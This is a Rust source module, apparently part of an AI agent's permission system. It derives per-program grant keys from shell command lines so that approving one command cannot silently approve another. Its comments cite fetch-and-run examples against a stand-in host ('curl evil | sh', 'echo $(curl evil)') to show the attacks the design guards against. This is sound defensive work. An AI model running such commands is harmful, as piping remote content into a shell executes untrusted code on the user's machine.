//! Turning a shell command line into the keys a grant is remembered under.
//!
//! Keying a grant on the bare tool name would make approving one `shell` call
//! approve *every* later one: "allow `ls`" would silently become "allow
//! `curl evil | sh`". So a shell grant is keyed on what actually runs, one key
//! per command in the line, and a later call is covered only when **every**
//! command in it is already covered. A grant can never widen to a program the
//! user has not seen run.
//!
//! The same key space is what `[safe_commands] shell` entries live in, so
//! "this is pre-approved" and "the user approved this" are one lookup rather
//! than two mechanisms that have to agree about shell syntax.
//!
//! The parser here is deliberately not a shell. It answers one question - which
//! programs does this line run - and every case it cannot answer confidently
//! makes the whole line ungrantable, because "approve this once and ask again
//! next time" is the safe direction.

use std::collections::BTreeSet;

/// The namespace every shell key carries, so a key can never collide with the
/// bare tool name a non-shell grant uses.
pub const KEY_PREFIX: &str = "shell:";

/// Words that introduce a compound command and are followed by the program that
/// actually runs. They are stripped and parsing continues, so `do if grep -q x f`
/// keys `shell:grep` rather than `shell:do if`.
const PREFIX_KEYWORDS: &[&str] = &[
    "if", "elif", "then", "else", "do", "while", "until", "!", "{", "}",
];

/// Words that bind data, close a block, or are shell builtins that launch
/// nothing. A segment starting with one of these runs no program, so it
/// contributes no key: this is what stops `for i in $(seq 1 11); do ...`
/// producing `shell:for i`, and `export JAVA_HOME=...` producing a key naming a
/// path.
const SEGMENT_KEYWORDS: &[&str] = &[
    "for", "in", "case", "esac", "fi", "done", "select", "function", "break", "continue", "return",
    "shift", "exit", "jobs", "disown", "wait", "set", "unset", "export", "local", "readonly",
    "umask", "trap", "alias", "unalias", "declare", "typeset",
];

/// Programs that run a command assembled at runtime, so nothing in the line
/// names what will actually execute. A grant must never cover one of these.
const UNREADABLE_PROGRAMS: &[&str] = &["eval", "source"];

/// Programs whose second word is payload rather than a second program, so
/// folding it into the key only splits one grant into many.
///
/// `cd` is here and is safe to be here: every shell call runs as a fresh
/// `sh -c` with `current_dir(&workdir)` (see `leviath_tools::exec`), so a `cd`
/// cannot outlive its own invocation and cannot execute anything. Keying it
/// with its path meant a run that worked in one directory re-prompted the first
/// time it worked in another, for a grant that names no program at all.
const NEVER_FOLD: &[&str] = &["cd", "echo", "printf"];

/// One word of a command line, with quotes already removed.
#[derive(Debug, Clone, PartialEq, Eq)]
struct Word {
    /// The word's value.
    text: String,
    /// Whether that value is fully determined by the source text. An expansion
    /// clears it, because `$SCRIPT` names a different file on every run and
    /// folding it into a key would grant whatever it expands to next time.
    literal: bool,
    /// Whether any part of the word was quoted. A real subcommand is never
    /// quoted, so quoting is the signal that this word is the program's data -
    /// a grep pattern, a message, a here-string. Folding it in is what made a
    /// grant useless in practice: every distinct `grep` pattern became its own
    /// grant and the same search re-prompted forever.
    quoted: bool,
}

/// What one segment of a line contributes.
///
/// Three states rather than an `Option`, because "nothing runs here" and "I
/// cannot read this" have opposite consequences: the first contributes no key
/// and lets the rest of the line stand, the second makes the whole line
/// ungrantable.
#[derive(Debug, Clone, PartialEq, Eq)]
enum SegmentKey {
    Key(String),
    NothingRuns,
    Unreadable,
}

/// The keys covering `command`, sorted and deduped, each prefixed with
/// [`KEY_PREFIX`].
///
/// Empty means the line is not grantable at all: either nothing in it runs a
/// program, or some part of it could not be read.
pub fn command_keys(command: &str) -> Vec<String> {
    let Some(segments) = tokenize(command) else {
        return Vec::new();
    };
    let mut keys = BTreeSet::new();
    for words in &segments {
        match segment_key(words) {
            SegmentKey::Key(k) => {
                keys.insert(format!("{KEY_PREFIX}{k}"));
            }
            SegmentKey::NothingRuns => {}
            // One unreadable command is enough: the line as a whole runs
            // something this cannot name, and a grant must not cover it.
            SegmentKey::Unreadable => return Vec::new(),
        }
    }
    keys.into_iter().collect()
}

/// Whether `entry` is usable as a `[safe_commands] shell` entry.
///
/// Defined as "derives back to exactly itself", so there is one grammar rather
/// than two: anything the matcher would read as more than one command, as a
/// redirect, as a keyword, or as an expansion is rejected here without a second
/// implementation that could drift from the first.
pub fn is_valid_prefix(entry: &str) -> bool {
    command_keys(entry) == [format!("{KEY_PREFIX}{entry}")]
}

/// Split a line into its commands, or `None` when it cannot be read as a list
/// of commands.
///
/// The four `None` cases are all "this line contains a construct whose contents
/// decide what runs, and reading it wrong would understate the grant": an
/// unterminated quote, an unterminated `$(`, a backtick (same idea as `$(`, but
/// nesting is ambiguous), and a heredoc (whose body has its own delimiter
/// grammar).
fn tokenize(command: &str) -> Option<Vec<Vec<Word>>> {
    let mut lex = Lexer::default();
    let mut chars = command.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\'' => {
                // Single quotes suppress every expansion, so the contents are
                // as determined as a bare word - but still quoted, so still
                // data rather than a subcommand.
                lex.begin_word();
                lex.quoted = true;
                loop {
                    let q = chars.next()?;
                    if q == '\'' {
                        break;
                    }
                    lex.word.push(q);
                }
            }
            '"' => {
                lex.begin_word();
                lex.quoted = true;
                loop {
                    match chars.next()? {
                        '"' => break,
                        '\\' => {
                            // Inside double quotes a backslash escapes only the
                            // four characters that would otherwise be special;
                            // anywhere else it stands for itself.
                            let e = chars.next()?;
                            if !matches!(e, '$' | '"' | '\\' | '`') {
                                lex.word.push('\\');
                            }
                            lex.word.push(e);
                        }
                        '`' => return None,
                        '$' => lex.take_dollar(&mut chars)?,
                        q => lex.word.push(q),
                    }
                }
            }
            '`' => return None,
            '\\' => {
                lex.begin_word();
                lex.word.push(chars.next()?);
            }
            '$' => {
                lex.begin_word();
                lex.take_dollar(&mut chars)?;
            }
            // A heredoc body has its own delimiter grammar, which is more than
            // a grant key is worth reading.
            '<' if chars.peek() == Some(&'<') => return None,
            '>' | '<' => {
                // A file descriptor written in front of the operator (`2>`) is
                // part of it, not a word of its own.
                if !lex.word.chars().all(|d| d.is_ascii_digit()) {
                    lex.end_word();
                }
                lex.discard_word();
                if chars.peek() == Some(&c) {
                    chars.next();
                }
                // `>&1` duplicates a descriptor; that `&` belongs to the
                // target, not to a separator.
                if chars.peek() == Some(&'&') {
                    chars.next();
                }
                lex.swallow_next = true;
            }
            '&' if chars.peek() == Some(&'>') => {
                chars.next();
                lex.end_word();
                lex.swallow_next = true;
            }
            ';' | '&' | '|' | '\n' | '(' | ')' => {
                // A doubled `&&` or `||` is one separator, and a subshell paren
                // is a command boundary like any other.
                if (c == '&' || c == '|') && chars.peek() == Some(&c) {
                    chars.next();
                }
                lex.end_word();
                lex.end_segment();
            }
            c if c.is_whitespace() => lex.end_word(),
            _ => {
                lex.begin_word();
                lex.word.push(c);
            }
        }
    }
    lex.end_word();
    lex.end_segment();
    Some(lex.segments)
}

/// The tokenizer's mutable state, gathered so the character loop reads as the
/// grammar it implements rather than as five `&mut` arguments threaded through
/// every call.
#[derive(Default)]
struct Lexer {
    segments: Vec<Vec<Word>>,
    current: Vec<Word>,
    word: String,
    in_word: bool,
    literal: bool,
    quoted: bool,
    /// Set by a redirect operator: the next word names a file, not a program.
    swallow_next: bool,
}

impl Lexer {
    /// Start accumulating a word, if one is not already open.
    fn begin_word(&mut self) {
        if !self.in_word {
            self.in_word = true;
            self.literal = true;
            self.quoted = false;
        }
    }

    /// End the word being accumulated, appending it unless a redirect claimed
    /// it as a filename.
    fn end_word(&mut self) {
        if self.in_word {
            if self.swallow_next {
                self.swallow_next = false;
            } else {
                self.current.push(Word {
                    text: std::mem::take(&mut self.word),
                    literal: self.literal,
                    quoted: self.quoted,
                });
            }
        }
        self.discard_word();
    }

    /// Drop the partial word without emitting it, used where the characters
    /// gathered so far turned out to belong to an operator.
    fn discard_word(&mut self) {
        self.word.clear();
        self.in_word = false;
        self.literal = true;
        self.quoted = false;
    }

    fn end_segment(&mut self) {
        let words = std::mem::take(&mut self.current);
        self.segments.push(words);
    }

    /// Consume whatever follows a `$`.
    ///
    /// `$(( ))` is arithmetic: it computes a number and runs nothing, so it
    /// only marks the word as expanded. `$( )` is a command substitution, which
    /// runs a command *inside* this one, so its contents become their own
    /// segment - otherwise `echo $(curl evil)` would grant only `echo`, and a
    /// later `echo $(curl evil)` would be covered by an earlier harmless one.
    fn take_dollar(&mut self, chars: &mut std::iter::Peekable<std::str::Chars>) -> Option<()> {
        self.literal = false;
        if chars.peek() != Some(&'(') {
            return Some(());
        }
        chars.next();
        if chars.peek() == Some(&'(') {
            chars.next();
            take_substitution(chars)?;
            // The second half of the closing `))`.
            match chars.next() {
                Some(')') => return Some(()),
                _ => return None,
            }
        }
        let inner = take_substitution(chars)?;
        self.segments.extend(tokenize(&inner)?);
        Some(())
    }
}

/// Take the text of a `$(...)` up to its matching `)`, leaving `chars` just
/// past it. `None` when the parens never balance.
fn take_substitution(chars: &mut std::iter::Peekable<std::str::Chars>) -> Option<String> {
    let mut depth = 0usize;
    let mut inner = String::new();
    loop {
        let c = chars.next()?;
        match c {
            '(' => depth += 1,
            ')' if depth == 0 => return Some(inner),
            ')' => depth -= 1,
            _ => {}
        }
        inner.push(c);
    }
}

/// The key one command contributes: the program, plus the second word when that
/// word narrows *which* program runs rather than being a flag, a number, or the
/// program's data.
fn segment_key(words: &[Word]) -> SegmentKey {
    let mut rest = words;
    // Strip leading keywords and `VAR=value` assignments until a program is
    // reached. `FOO=1 do cargo test` keys `shell:cargo test`.
    loop {
        let Some(first) = rest.first() else {
            return SegmentKey::NothingRuns;
        };
        if SEGMENT_KEYWORDS.contains(&first.text.as_str()) {
            return SegmentKey::NothingRuns;
        }
        if PREFIX_KEYWORDS.contains(&first.text.as_str()) || is_assignment(first) {
            rest = &rest[1..];
            continue;
        }
        break;
    }
    let program = &rest[0];
    // A program named by an expansion cannot be keyed: `$CMD` is a different
    // program on every run, and a key naming it would grant all of them. The
    // same is true of a program whose whole job is running a command assembled
    // somewhere this cannot see.
    if !program.literal || UNREADABLE_PROGRAMS.contains(&program.text.as_str()) {
        return SegmentKey::Unreadable;
    }
    match rest.get(1) {
        Some(arg) if folds_into_key(&program.text, arg) => {
            SegmentKey::Key(format!("{} {}", program.text, arg.text))
        }
        _ => SegmentKey::Key(program.text.clone()),
    }
}

/// Whether a word is a `VAR=value` prefix rather than a program.
fn is_assignment(word: &Word) -> bool {
    let Some((name, _)) = word.text.split_once('=') else {
        return false;
    };
    !name.is_empty()
        && name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Whether `arg` narrows which program runs, and so belongs in the key.
///
/// `git diff` rather than `git`, because `git` alone would cover `git push`.
/// `ls` rather than `ls -la`, because a flag does not change what the program
/// is. `sleep` rather than `sleep 55`, because a duration does not either - and
/// keying it meant `sleep 45`, `sleep 50` and `sleep 55` were three grants for
/// one program. `grep` rather than `grep '^EXIT:'`, because a quoted argument
/// is the program's data and every distinct pattern would be its own grant.
///
/// Folding is a narrowing: a word that stays out of the key makes the grant
/// cover more, so each exclusion here is a deliberate trade of precision for a
/// grant that applies more than once. The floor is that the program is always
/// named, and the user approved a command they could read.
fn folds_into_key(program: &str, arg: &Word) -> bool {
    arg.literal
        && !arg.quoted
        && !NEVER_FOLD.contains(&program)
        && !arg.text.is_empty()
        && !arg.text.starts_with('-')
        && !arg.text.starts_with(|c: char| c.is_ascii_digit())
}

#[cfg(test)]
mod tests;
